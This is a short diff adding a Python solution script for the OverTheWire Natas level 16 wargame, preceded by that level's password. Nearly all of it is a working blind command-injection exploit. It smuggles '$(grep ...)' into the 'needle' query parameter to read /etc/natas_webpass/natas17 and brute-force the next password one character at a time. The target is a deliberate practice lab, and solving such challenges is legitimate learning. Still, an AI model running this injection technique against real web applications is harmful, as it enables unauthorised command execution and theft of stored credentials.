@@ -1,0 +1,25 @@
+natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+
+import requests, string
+from requests.auth import HTTPBasicAuth
+
+url = 'http://natas16.natas.labs.overthewire.org/?needle='
+auth = HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
+allchars = ''.join([string.ascii_letters,string.digits])
+common = 'outputs'
+filteredchars = ''
+passwd = ''
+
+for char in allchars:
+	r = requests.get(f'{url}{common}$(grep {char} /etc/natas_webpass/natas17)', auth=auth)
+	if common not in r.text:
+		filteredchars = filteredchars + char
+		print(filteredchars)
+
+for i in range(32):
+	for char in filteredchars:
+		r = requests.get(f'{url}{common}$(grep ^{passwd}{char} /etc/natas_webpass/natas17)', auth=auth)
+		if common not in r.text:
+			passwd = passwd + char
+			print(passwd)
+			break
